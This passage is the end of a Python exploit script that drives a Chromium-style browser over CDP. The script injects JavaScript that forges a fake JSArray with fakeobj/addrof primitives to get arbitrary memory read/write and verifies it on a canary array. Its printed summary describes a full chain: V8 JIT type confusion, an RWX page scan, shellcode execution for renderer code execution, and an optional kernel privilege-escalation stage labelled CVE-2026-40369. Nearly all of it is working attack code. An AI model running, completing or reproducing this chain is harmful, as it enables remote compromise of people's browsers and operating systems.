        setAt(INLINE, fakeobj(cage | JSARRAY_DOUBLE_MAP));
        setAt(INLINE + 4n, fakeobj(cage | 0x{EFA:08x}n));
        setAt(INLINE + 8n, fakeobj((Runtag + fdaOff) | 1n));
        setAt(INLINE + 0xcn, 0x3fffffff);

        var fakeArr = fakeobj((Runtag + INLINE) | 1n);
        if (!fakeArr || typeof fakeArr !== 'object') {{
            resolve('FAIL:fakeArr'); return;
        }}
        KEEP.push(fakeArr);

        var dataBase = Runtag + fdaOff + 8n;
        var rdq = function(q) {{ return f2i(fakeArr[Number((q - dataBase) >> 3n)]); }};
        var wrq = function(q, v) {{ fakeArr[Number((q - dataBase) >> 3n)] = i2f(v); }};
        var M64 = (1n << 64n) - 1n;

        window.read64 = function(T) {{
            var off = T & 7n;
            if (off === 0n) return rdq(T);
            var lo = rdq(T - off), hi = rdq(T - off + 8n);
            return ((lo >> (off * 8n)) | (hi << ((8n - off) * 8n))) & M64;
        }};
        window.write64 = function(T, v) {{
            var off = T & 7n;
            if (off === 0n) {{ wrq(T, v & M64); return; }}
            var base = T - off, lo = rdq(base), hi = rdq(base + 8n);
            var loMask = (1n << (off * 8n)) - 1n;
            var hiMask = ~((1n << ((8n - off) * 8n)) - 1n) & M64;
            wrq(base, ((lo & loMask) | ((v << (off * 8n)) & M64)) & M64);
            wrq(base + 8n, (hi & hiMask) | (v >> ((8n - off) * 8n)));
        }};
        window.cage = cage;

        var canary = [13.37, 42.42];
        KEEP.push(canary);
        var cAddr = addrof(canary);
        if (typeof cAddr !== 'bigint') {{ resolve('FAIL:addrof(canary)'); return; }}
        var cUntag = (cAddr & 0xffffffffn) + cage - 1n;
        var elemC = read64(cUntag + 8n) & 0xffffffffn;
        var elemAddr = (cage | elemC) & ~1n;
        var d0 = i2f(read64(elemAddr + 8n));

        if (d0 !== 13.37) {{
            resolve('FAIL:read=' + d0); return;
        }}

        write64(elemAddr + 16n, f2i(99.99));
        if (canary[1] !== 99.99) {{
            resolve('FAIL:write=' + canary[1]); return;
        }}
        canary[1] = 42.42;

        resolve(JSON.stringify({{
            status: 'ARW_OK',
            cage: hex(cage),
        }}));
    """

    try:
        val, err = cdp.js_async(arw_code, timeout=180)
        if err:
            print(f"[!] ARW failed: {err}")
        elif isinstance(val, str) and val.startswith("FAIL"):
            print(f"[!] ARW failed: {val}")
        else:
            try:
                result = json.loads(val)
                print(f"[+] ARBITRARY R/W CONFIRMED! cage={result['cage']}")
            except:
                print(f"[!] ARW result: {val}")
    except Exception:
        print("[!] ARW skipped (renderer not responsive after shellcode execution)")

    # ===== PHASE 7: Kernel exploit (optional) =====
    if not args.skip_kernel:
        print("\n" + "=" * 60)
        kernel_success = kernel_exploit_ntqsi253()
        if not kernel_success:
            print("[*] Kernel exploit did not complete (may need build-specific tuning)")
    else:
        print("\n[*] Skipping kernel exploit (--skip-kernel)")

    # ===== Summary =====
    print("\n" + "=" * 60)
    print("[+] EXPLOIT CHAIN STATUS:")
    print("    Phase 1 (Primitives):   COMPLETE -- addrof/fakeobj via TurboFan CSE")
    print("    Phase 2 (Map detect):   COMPLETE -- RPM on renderer process")
    print("    Phase 3 (WASM target):  COMPLETE -- JIT compiled")
    print("    Phase 4 (JIT scan):     COMPLETE -- RWX page found")
    print("    Phase 5 (Shellcode):    COMPLETE -- renderer RCE via JIT overwrite")
    print("    Phase 6 (ARW):          fake JSArray R/W primitive")
    if not args.skip_kernel:
        print("    Phase 7 (Kernel LPE):   CVE-2026-40369 (build-dependent)")
    print("=" * 60)

    cdp.close()
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except:
        proc.kill()


if __name__ == "__main__":
    main()
